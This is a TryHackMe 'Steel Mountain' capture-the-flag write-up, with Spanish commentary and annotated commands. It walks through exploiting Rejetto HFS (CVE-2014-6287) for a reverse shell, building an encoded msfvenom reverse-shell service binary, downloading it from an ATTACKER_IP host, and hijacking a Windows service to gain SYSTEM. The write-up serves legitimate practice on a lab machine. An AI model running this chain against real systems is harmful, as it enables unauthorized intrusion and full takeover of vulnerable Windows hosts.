# Steel Mountain - TryHackMe Writeup

## Recon

```bash
# What it does: run a fast port scan on the target.
# Why here: identify the full attack surface, including the vulnerable HFS service on port 8080, before running deep service scripts.
nmap -sS -p- -n -Pn --min-rate 5000 $TARGET --open -oN silent

# What it does: perform service version detection and run default scripts on all open ports.
# Why here: identify the Rejetto HTTP File Server version for exploit matching.
nmap -sVC -p80,135,139,445,3389,5985,8080,47001,49152,49153,49154,49155,49156,49193,49194 $TARGET -oN service
```

Vemos HTTP abierto en los puertos 80 y 8080. Inspeccionando el puerto 8080 aparece Rejetto HTTP File Server, vulnerable a CVE-2014-6287.

## Explotacion

```bash
# What it does: search for exploits matching the detected Rejetto HFS version.
# Why here: verify the existence of a public exploit (CVE-2014-6287) for the target service.
searchsploit rejetto http

# What it does: download the chosen exploit script (39161.py) from the Exploit-DB local mirror.
# Why here: prepare the exploit for customization and execution against the target.
searchsploit windows/remote/39161.py -m
```

Editar en el exploit:

```python
# What it does: update the exploit script with the attacker's listener details.
# Why here: ensure the reverse shell payload connects back to the correct attacker IP and port.
ip_addr = "ATTACKER_IP"
local_port = "443"
```

Copiamos `nc.exe`, servimos el binario y lanzamos el exploit:

```bash
# What it does: copy the Windows netcat binary to the temporary directory.
# Why here: prepare the binary for download by the target as part of the exploitation sequence.
cp /usr/share/windows-resources/binaries/nc.exe /tmp/

# What it does: start a temporary HTTP server on the attacker machine.
# Why here: host the nc.exe binary so the target can download it using the command injection in HFS.
sudo python3 -m http.server 80

# What it does: open a TCP listener with rlwrap for an enhanced shell experience.
# Why here: capture the incoming reverse shell from the Rejetto HFS exploit.
rlwrap nc -lvnp 443

# What it does: run the customized exploit against the target.
# Why here: trigger the RCE in HFS to download and execute netcat, providing an initial reverse shell.
/usr/bin/python2 39161.py $TARGET 8080
```

Navegamos al Desktop del usuario `bill` y obtenemos la flag.

## Privilege Escalation

```cmd
REM What it does: enumerate all installed services and their binary paths.
REM Why here: identify services with binary paths outside of C:\Windows that might be vulnerable to unquoted service paths or insecure permissions.
wmic service get name,displayname,pathname,startmode | findstr /v /i "C:\Windows"
```

Generamos un binario de servicio que abre reverse shell:

```bash
# What it does: create a malicious Windows service executable using msfvenom.
# Why here: generate a payload to replace a vulnerable service binary for privilege escalation to SYSTEM.
msfvenom -p windows/shell_reverse_tcp LHOST=ATTACKER_IP LPORT=4443 -e x86/shikata_ga_nai -f exe-service -o Advanced.exe
```

Transferimos el payload y reemplazamos el servicio vulnerable:

```cmd
REM What it does: download the malicious service binary to the target.
REM Why here: place the privilege escalation payload on the victim machine.
powershell -c "Invoke-WebRequest -Uri http://ATTACKER_IP/Advanced.exe -OutFile Advanced.exe"

REM What it does: stop the vulnerable AdvancedSystemCareService9 service.
REM Why here: halt the service to allow for the replacement of its executable binary.
sc stop AdvancedSystemCareService9

REM What it does: overwrite the legitimate service binary with the malicious one.
REM Why here: hijack the service execution so that it runs our reverse shell on start.
copy Advanced.exe ASCService.exe

REM What it does: restart the hijacked service.
REM Why here: trigger the execution of the reverse shell payload with SYSTEM privileges.
sc start AdvancedSystemCareService9
```

Con la shell privilegiada:

```cmd
REM What it does: identify the current user context.
REM Why here: confirm successful privilege escalation to NT AUTHORITY\SYSTEM.
whoami

REM What it does: read the root flag.
REM Why here: confirm full system compromise and complete the challenge.
type root.txt
```


